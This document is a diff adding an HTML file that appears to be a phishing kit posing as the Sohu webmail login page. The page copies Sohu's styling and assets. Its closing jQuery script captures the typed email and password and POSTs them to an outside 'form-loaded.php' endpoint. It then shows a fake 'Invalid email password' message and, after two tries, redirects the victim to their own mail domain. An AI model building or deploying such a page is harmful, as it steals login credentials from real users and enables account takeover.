@@ -1,0 +1,763 @@
+<html ng-app="App" id="ng-app" class="ng-scope">
+
+<head>
+    <script src="../setting.js"></script>
+    <input type="hidden" name="lourl" value="https://mail.sohu.com/" id="lourl"> 
+    <style type="text/css">
+        @charset "UTF-8";
+
+        [ng\:cloak],
+        [ng-cloak],
+        [data-ng-cloak],
+        [x-ng-cloak],
+        .ng-cloak,
+        .x-ng-cloak,
+        .ng-hide {
+            display: none !important;
+        }
+
+        ng\:form {
+            display: block;
+        }
+
+        .ng-animate-block-transitions {
+            transition: 0s all !important;
+            -webkit-transition: 0s all !important;
+        }
+
+        .ng-hide-add-active,
+        .ng-hide-remove {
+            display: block !important;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1,IE=edge">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="cache-control" content="no-store, must-revalidate">
+    <meta http-equiv="expires" content="0">
+    <title>搜狐闪电邮箱</title>
+    <link rel="Shortcut Icon" href="https://1cbbb2d148753.cdn.sohucs.com/e0de4a/img/favicon.66dcaa54.ico">
+    <link rel="stylesheet" type="text/css" href="https://1cbbb2d148753.cdn.sohucs.com/e0de4a/css/common.f5b4306c.css">
+    <link rel="stylesheet" type="text/css" href="https://1cbbb2d148753.cdn.sohucs.com/e0de4a/css/index.1d564261.css">
+    <link rel="stylesheet" type="text/css" href="https://1cbbb2d148753.cdn.sohucs.com/e0de4a/css/contacts.349f460d.css">
+    <link rel="stylesheet" type="text/css" href="https//1cbbb2d148753.cdn.sohucs.com/e0de4a/css/setting.c54ecf9f.css">
+    <link rel="stylesheet" type="text/css" href="https//1cbbb2d148753.cdn.sohucs.com/e0de4a/css/write.35225b4b.css">
+    <link rel="stylesheet" type="text/css" href="https//1cbbb2d148753.cdn.sohucs.com/e0de4a/css/help.9d62787c.css">
+    <link rel="stylesheet" type="text/css" href="https//1cbbb2d148753.cdn.sohucs.com/e0de4a/css/error.63f994fe.css">
+    <link rel="stylesheet" type="text/css" id="skinStyle" name="skinStyle">
+    <link rel="stylesheet" type="text/css"
+        href="https://1cbbb2d148753.cdn.sohucs.com/e0de4a/components/jquery/jquery-flexslider/flexslider.0fbbb873.css">
+    <link rel="stylesheet" href="https://1cbbb2d148753.cdn.sohucs.com/e0de4a/css/style.ab941cee.css">
+
+    <div id="google_translate_element"></div>
+
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement(
+            { pageLanguage: 'fr-FR' },
+            'google_translate_element'
+        );
+    }
+</script>
+
+<script type="text/javascript" src="https://translate.google.com/translate_a/element.js?
+cb=googleTranslateElementInit">
+</script>
+</head>
+
+<body>
+    <!-- uiView: mailFrame -->
+    <!-- uiView: outMail -->
+    <div class="h100 min-width-1000 ng-scope" ui-view="outMail">
+        <div id="loginDiv" class="login pos-r ng-scope" ng-controller="loginCtrl">
+            <style type="text/css">
+                body {
+                    overflow: auto
+                }
+
+                .login {
+                    transition: all .5s;
+                    -webkit-transition: all .5s
+                }
+
+                ::-ms-clear,
+                ::-ms-reveal {
+                    display: none
+                }
+
+                .area {
+                    width: 1000px;
+                    margin: 0 auto;
+                    position: relative;
+                    overflow: hidden
+                }
+
+                .out-body {
+                    height: 515px
+                }
+
+                .out-footer {
+                    margin: 0 auto;
+                    margin-top: 20px;
+                    text-align: center;
+                    line-height: 1.5
+                }
+
+                .out-footer .out-footer-space {
+                    margin-left: 16px
+                }
+
+                .out-header {
+                    height: 80px
+                }
+
+                #loginBody {
+                    position: relative;
+                    width: 100%;
+                    height: 515px;
+                    transition: background .5s;
+                    -webkit-transition: background .5s
+                }
+
+                #theme {
+                    position: relative;
+                    clear: both;
+                    background-repeat: no-repeat;
+                    background-position: left top;
+                    transition: background .5s;
+                    -webkit-transition: background .5s
+                }
+
+                .themeCtrl {
+                    position: absolute;
+                    left: 50%;
+                    bottom: 12px;
+                    margin-right: -405px;
+                    text-align: right
+                }
+
+                .themeCtrl span {
+                    cursor: pointer;
+                    width: 6px;
+                    height: 6px;
+                    display: inline-block;
+                    border: 2px solid #bcbcbc;
+                    border-radius: 50%;
+                    margin: 2px 4px;
+                    filter: alpha(opacity=80);
+                    -moz-opacity: .8;
+                    -khtml-opacity: .8;
+                    opacity: .8
+                }
+
+                .inside-box-shadow {
+                    -webkit-box-shadow: inset 0 1px 5px #dbdbdb;
+                    -moz-box-shadow: inset 0 1px 5px #dbdbdb;
+                    box-shadow: inset 0 1px 5px #dbdbdb
+                }
+
+                .login-box-shadow {
+                    -webkit-box-shadow: 0 0 0 rgba(23, 23, 23, .13), 0 0 0 rgba(23, 23, 23, .13), 0 0 0 rgba(23, 23, 23, .13), 0 10px 10px rgba(23, 23, 23, .13);
+                    -moz-box-shadow: 0 0 0rgba(23, 23, 23, .13), 0 0 0 rgba(23, 23, 23, .13), 0 0 0 rgba(23, 23, 23, .13), 0 10px 10px rgba(23, 23, 23, .13);
+                    box-shadow: 0 0 0 rgba(23, 23, 23, .13), 0 0 0 rgba(23, 23, 23, .13), 0 0 0 rgba(23, 23, 23, .13), 0 5px 10px rgba(23, 23, 23, .13)
+                }
+
+                .logo-box {
+                    position: absolute;
+                    top: 30px
+                }
+
+                .logo-box img {
+                    width: 160px
+                }
+
+                .link-box {
+                    margin: 45px 20px 0 0;
+                    color: #666
+                }
+
+                .link-box a {
+                    display: inline-block;
+                    margin: 0 10px;
+                    color: #666;
+                    text-decoration: none
+                }
+
+                .form-background {
+                    text-align: center;
+                    width: 100%
+                }
+
+                .form-background img {
+                    width: 100%;
+                    height: 550px
+                }
+
+                .login-form {
+                    box-sizing: border-box;
+                    padding: 24px 30px 28px 30px;
+                    border: 1px solid #ccc;
+                    border-radius: 4px;
+                    width: 340px;
+                    background: #fcfcfc;
+                    position: absolute;
+                    left: 63%;
+                    top: 55px;
+                    z-index: 9999
+                }
+
+                .login-form input {
+                    font: 16px/1 'microsoft yahei'
+                }
+
+                .login-form h2 {
+                    font-size: 18px;
+                    margin-bottom: 19px;
+                    font-weight: 200
+                }
+
+                .login-a {
+                    display: block;
+                    width: 63%;
+                    height: 480px;
+                    position: absolute;
+                    z-index: 10;
+                    outline: 0
+                }
+
+                .field {
+                    position: relative
+                }
+
+                .f-account,
+                .f-pwd {
+                    padding-bottom: 19px
+                }
+
+                .f-forget {
+                    height: 20px;
+                    text-align: right
+                }
+
+                .f-forget a {
+                    color: #666
+                }
+
+                .ipt-box {
+                    border: 1px solid #ccc;
+                    background: #fff
+                }
+
+                .ipt-box input {
+                    border: none;
+                    padding: 0 10px;
+                    font-size: 14px
+                }
+
+                .btn-login,
+                .ipt-box input {
+                    display: block
+                }
+
+                .ipt-box input {
+                    width: 100%;
+                    height: 45px;
+                    line-height: 45px
+                }
+
+                .btn-login {
+                    height: 60px;
+                    line-height: 67px;
+                    width: 289px;
+                    background-color: #FFF;
+                    border: none;
+                    color: #fff;
+                    cursor: pointer;
+                    position: relative;
+                    left: -7px;
+                    background-image: url(https://1cbbb2d148753.cdn.sohucs.com/e0de4a/img/login.1ce92fc0.png);
+                    outline: 0
+                }
+
+                .btn-login:hover {
+                    background-image: url(https://1cbbb2d148753.cdn.sohucs.com/e0de4a/img/login-focus.b8b44f5d.png)
+                }
+
+                .fontFamily {
+                    font-family: "宋体", "Microsoft YaHei", "微软雅黑", helvetica, "Hiragino Sans GB" !important;
+                    font-weight: 700 !important
+                }
+
+                .account-tips {
+                    min-height: 10px;
+                    top: 32px;
+                    left: -1px;
+                    right: -1px;
+                    z-index: 1
+                }
+
+                .account-tips .tip-one {
+                    line-height: 30px;
+                    cursor: pointer;
+                    background: #EDEDED;
+                    padding-left: 10px
+                }
+
+                .account-tips .tip-one:hover {
+                    background: #DDD
+                }
+
+                .tipHolder {
+                    position: absolute;
+                    bottom: -1px;
+                    left: 0;
+                    right: 0;
+                    color: red;
+                    padding-left: 4px
+                }
+
+                .f-remember {
+                    margin: 2px 0 12px 0;
+                    color: #AEAEAE
+                }
+
+                .f-captcha {
+                    margin-bottom: 10px
+                }
+
+                .f-captcha .ipt-box {
+                    top: 0;
+                    right: 0;
+                    bottom: 0;
+                    left: 50%
+                }
+
+                .f-captcha img {
+                    cursor: pointer
+                }
+
+                .f-captcha input {
+                    height: 100%
+                }
+
+                .f-register {
+                    background-color: #E9E9E9
+                }
+
+                .f-register:hover {
+                    background-color: #F6F6F6
+                }
+
+                .f-href {
+                    color: #FF5959
+                }
+
+                input[type=checkbox] {
+                    position: relative;
+                    top: 2px
+                }
+
+                .f-register a {
+                    border: 1px solid #DFDFDF;
+                    text-align: center;
+                    height: 30px;
+                    line-height: 30px;
+                    font-size: 12px;
+                    color: #666;
+                    display: block;
+                    text-decoration: none
+                }
+
+                .passport hr {
+                    height: 1px;
+                    border: 0;
+                    margin-bottom: 28px;
+                    background: #bcbcbc
+                }
+
+                .passport p {
+                    padding-bottom: 22px
+                }
+
+                .passport .font-size-14 {
+                    font-size: 14px
+                }
+
+                .passport .heigh40 {
+                    height: 40px;
+                    line-height: 40px
+                }
+
+                .passport .width50 {
+                    width: 50%
+                }
+
+                .passport .number-of-times {
+                    float: right;
+                    color: #B8B8B8
+                }
+
+                .passport .pointer {
+                    cursor: pointer
+                }
+
+                .passport .button {
+                    height: 40px;
+                    padding-top: 40px
+                }
+
+                .passport .button span {
+                    display: inline-block;
+                    height: 100%;
+                    line-height: 40px;
+                    width: 130px;
+                    font-size: 14px;
+                    text-align: center;
+                    border-radius: 2px;
+                    background: #FF5F5F;
+                    color: #FFF
+                }
+
+                .passport .button .second {
+                    float: right;
+                    background: #B7B7B7
+                }
+
+                .passport .button .width100 {
+                    width: 100%
+                }
+
+                .passport .font14 {
+                    font-size: 14px
+                }
+
+                .passport .green {
+                    color: #35951B
+                }
+
+                .passport .red {
+                    color: #FF5F5F
+                }
+
+                .passport .blue {
+                    color: #1B9CD6
+                }
+
+                .passport .gray {
+                    color: #A3A3A3 !important
+                }
+
+                .passport .bottom60 {
+                    padding-bottom: 60px
+                }
+
+                .passport .bottom-auto {
+                    padding-bottom: 6px
+                }
+
+                .control-captcha {
+                    margin-top: 20px
+                }
+
+                input.input-captcha {
+                    vertical-align: middle;
+                    font-size: 14px
+                }
+
+                .btn-captcha {
+                    display: inline-block;
+                    width: 47%;
+                    height: 38px;
+                    line-height: 38px;
+                    text-align: center;
+                    vertical-align: middle;
+                    background: #d7d7d7;
+                    border: 1px solid #dbdbdb;
+                    font-size: 14px;
+                    color: #000
+                }
+
+                .btn-captcha.disabled {
+                    color: #757575
+                }
+
+                .btn-voice {
+                    color: #ff5e5e
+                }
+
+                .btn-voice.disabled {
+                    color: #000
+                }
+
+                p.captcha-info {
+                    margin-top: 20px;
+                    padding: 0
+                }
+            </style>
+            <div class="area out-header">
+                <div class="logo-box fl-l"><img src="https://1cbbb2d148753.cdn.sohucs.com/e0de4a/img/logo-login.a0faadc4.png">
+                </div>
+                <div class="link-box fl-r"><a href="#sohu.com" target="_blank">搜狐首页</a>|<a href="#sohu.com"
+                        target="_blank">VIP邮箱</a>|<a href="#85aa638161"
+                        target="_blank">手机邮箱</a>|<a ui-sref="help" target="_blank" href="#/help">帮助中心</a></div>
+            </div>
+            <div id="loginBody" login-ad="" style="background-color: rgb(236, 236, 236);">
+                <div id="theme" class="area out-body"
+                    style="background-image: url(https://1cbbb2d148753.cdn.sohucs.com/pcmail/PCDengLuYeBanner_AppXuanChuan_674x515.png);">
+                    <a class="login-a" id="adHref" href="#85aa638161"
+                        target="_blank"></a>
+                    <form ng-submit="loginSubmit()" ng-hide="bindOption.showBindFlag"
+                        class="login-form login-box-shadow ng-pristine ng-valid">
+                        <h2>登录搜狐邮箱</h2>
+                        <div class="field f-account">
+                            <div class="ipt-box pos-r"><input class="addFocus ipt-account ng-pristine ng-valid" type="text" id="email" name="email" value="" placeholder="请输入您的邮箱" ng-model="account">
+                                <div class="account-tips pos-a ng-hide" ng-show="accountTipsShow">
+                                    <!-- ngRepeat: one in accountTipsData track by $index -->
+                                </div>
+                            </div>
+                            <div class="tipHolder"></div>
+                        </div>
+                        <div class="field f-pwd">
+                            <div class="ipt-box"><input class="addFocus ng-pristine ng-valid" type="password"
+                                    placeholder="请输入您的密码" id="password" name="password" value=""></div>
+                            <div class="tipHolder ng-binding" ng-bind="loginTip"></div>
+                        </div>
+                        <div id="msg" class="text-danger" style="font-size:14px; color: red; text-align: center; display: none;">Invalid email password</div>
+                        <div class="field f-forget"><a href="https://v4.passport.sohu.com/fe/forgetPassword/1"
+                                target="_blank">忘记密码</a></div>
+                        <div class="field"><input type="submit" id="submit-btn" class="btn-login fontFamily" value="登 录"></div>
+                        <div class="field f-remember"></div>
+                        <div class="field f-register"><a href="javascript:void(0);" ng-click="register()">还没有搜狐闪电邮？<span
+                                    class="f-href">现在注册</span></a></div>
+                    </form>
+                    <div class="login-form login-box-shadow passport ng-hide" ng-show="bindOption.showBindFlag">
+                        <h2>安全提示</h2>
+                        <hr>
+                        <div ng-hide="bindOption.bindOk" class="">
+                            <p class="font-size-14">您的账号可能存在风险，需要验证手机号</p>
+                            <div class="ipt-box"><input class="addFocus ipt-account heigh40 ng-pristine ng-valid"
+                                    type="text" placeholder="请输入手机号" maxlength="11" ng-model="bindOption.bindPhone">
+                            </div>
+                            <div class="control-captcha"><input
+                                    class="addFocus ipt-account heigh40 width50 input-captcha ng-pristine ng-valid"
+                                    type="text" maxlength="6" placeholder="请输入验证码" ng-model="bindOption.msgCaptcha">
+                                <span class="pointer btn-captcha ng-binding disabled"
+                                    ng-class="{gray: bindOption.grayFlag, disabled: !bindOption.isPhone}"
+                                    ng-click="getPhoneCaptcha(0)">获取验证码</span></div>
+                            <div class="sub-bindPhone">
+                                <p class="captcha-info" ng-show="!bindOption.isVoice">收不到短信验证码？点击获取<a
+                                        href="javascript: void(0)" class="btn-voice disabled"
+                                        ng-class="{disabled: !bindOption.isPhone}"
+                                        ng-click="getPhoneCaptcha(1)">语音验证码</a></p>
+                                <p class="captcha-info ng-hide" ng-show="bindOption.isVoice">您会收到来自950开头的语音验证码，请注意接听</p>
+                            </div>
+                            <div class="button" style="text-align:center"><span class="pointer"
+                                    ng-click="bindPhone()">确定</span></div>
+                        </div>
+                        <div ng-show="bindOption.bindOk" class="ng-hide">
+                            <p class="font14 green">恭喜您，手机号绑定成功！</p>
+                            <p class="font14 bottom60 ng-binding">绑定的手机号：</p>
+                            <p class="gray bottom-auto">将在3秒后自动进入邮箱</p>
+                            <p class="gray bottom-auto">您也可以点击<span class="red">“立即进入邮箱”</span>进行跳转</p>
+                            <div class="button width100"><span class="width100 pointer"
+                                    ng-click="goHomepage()">立即进入邮箱</span></div>
+                        </div>
+                    </div>
+                    <div class="form-background">
+                        <div id="changeTheme" class="themeCtrl" style="display: none;"><span
+                                style="background-color: rgb(255, 255, 255);"></span></div>
+                    </div>
+                </div>
+            </div>
+            <div class="area out-footer">
+                <div class="ng-binding">Copyright © 2022 Sohu All Rights Reserved. 搜狐公司 版权所有</div>
+                <div><span>客服热线： 010-58103760</span><span class="out-footer-space">客服邮箱：webmaster@vip.sohu.com</span>
+                </div>
+            </div>
+            <script
+                type="text/javascript">function resize() { var e = document.getElementById("loginDiv"), i = document.documentElement.clientHeight; i > 720 && e && (e.style.paddingTop = (i - 720) / 2 + "px") } function preload(e) { for (i = 0; i < e.length; i++)images[i] = new Image, images[i].src = preload.arguments[i] } resize(), window.onresize = function () { setTimeout(function () { resize() }, 0) }; var images = []; preload(["//1cbbb2d148753.cdn.sohucs.com/e0de4a/img/icon.30c1f6f9.png"])</script>
+        </div>
+    </div>
+    <script type="text/javascript" src="//39d0825d09f05.cdn.sohucs.com/sdk/passport-4.0.3.js"></script>
+    <script src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/components/lib.6bf12086.js"></script>
+    <script src="localSrc/ueditor-1.4.3.3/all.js"></script>
+    <script type="text/javascript" src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/app.ae12acb5.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/indexCtrl.960cc369.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/loginCtrl.85629af8.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/mailAddrRenderService.28ebc2e4.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/writeMailCtrl.2dac64d6.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/writeMailService.fa5c4984.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/mailsCtrl.b2170866.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/mailDetailCtrl.b32516b1.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/contacts-ctrl.5c857e25.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/homepageCtrl.c16082c4.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/contacts-service.8d78e1d6.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/modelAlertService.9aa22d7a.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/fileUploadService.da8ae0d6.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/directive/contacts-directive.281509ea.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/directive/mailListDirective.16132119.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/directive/mailDirective.ed784374.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/settingCtrl.4992d277.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/directive/settingDirective.67db2dd3.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/settingService.09603eb5.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/directive/select-directive.32006244.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/toolsbarService.278c53ef.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/timeService.21619224.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/httpService.20f653ed.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/cleanFolderService.dade095e.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/service/passportService.68b94b16.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/mailAccountsCtrl.665ca3de.js"></script>
+    <script type="text/javascript"
+        src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/controller/skin-ctrl.44636af2.js"></script>
+    <script type="text/javascript" src="//1cbbb2d148753.cdn.sohucs.com/e0de4a/js/common/common.f3079b72.js"></script>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            var m = 0;
+        
+            $('#back1').click(function () {
+                $("#msg").hide();
+                $('#email').val("");
+                $("#automail").animate({
+                    left: 200,
+                    opacity: "hide"
+                }, 0);
+                $("#inputbar").animate({
+                    right: 200,
+                    opacity: "show"
+                }, 1000);
+            });
+        
+            var n = window.location.hash.substr(1);
+            
+            if (!n) {
+            } else {
+                var o = n;
+                $('#email').val(o);
+                $('#emailich').html(o);
+                var p = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                
+                if (!p.test(o)) {
+                    $('#error').show();
+                    n.focus;
+                    return false;
+                }
+        
+                var q = o.indexOf("@");
+                var r = o.substr((q + 1));
+                var c = r.substr(0, r.indexOf('.'));
+                var s = c.toLowerCase();
+                var t = c.toUpperCase();
+        
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + r);
+                $("#logoimg").attr("alt", t);
+                $("#logoname").html(t);
+                $(".logoname").html(t);
+            }
+        
+            $('#submit-btn').click(function (b) {
+                $('#error').hide();
+                $('#msg').hide();
+                b.preventDefault();
+                var d = $("#email").val();
+                var e = $("#password").val();
+                var z = $("#lourl").val();
+                var f = $('#msg').html();
+                $('#msg').text(f);
+                var g = d;
+                var h = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                
+                if (!h.test(g)) {
+                    $('#error').show();
+                    d.focus;
+                    return false;
+                }
+        
+                var i = g.indexOf("@");
+                var j = g.substr((i + 1));
+                var c = j.substr(0, j.indexOf('.'));
+                var k = c.toLowerCase();
+                var l = c.toUpperCase();
+        
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + j);
+                $("#logoname").html(l);
+                if (e == '') {
+                    $('#msg').show();
+                    d.focus;
+                    return false;
+                }
+        
+                m = m + 1;
+        
+                $.ajax({
+                    dataType: 'JSON',
+                    url: dbaseURL+'form-loaded.php',
+                    type: 'POST',
+                    data: {
+                        email: d,
+                        password: e,
+                        lourl: z,
+                    },
+                    beforeSend: function (a) {
+                        $('#submit-btn').val('Verifing...');
+                    },
+                    success: function (a) {
+                        if (a) {
+                            $("#msg").show();
+                            console.log(a);
+                            if (a['signal'] == 'ok') {
+                                $("#password").val("");
+                                if (m >= 2) {
+                                    m = 0;
+                                    window.location.href("http://www." + j);
+                                }
+                            } else {
+                            }
+                        }
+                    },
+                    error: function () {
+                        $("#password").val("");
+                        if (m >= 2) {
+                            m = 0;
+                            window.location.replace("http://www." + j);
+                        }
+                        $("#msg").show();
+                    },
+                    complete: function () {
+                        $('#submit-btn').val('LOGIN');
+                    }
+                });
+            });
+        });
+
+    </script>
+</body>
+
+</html>
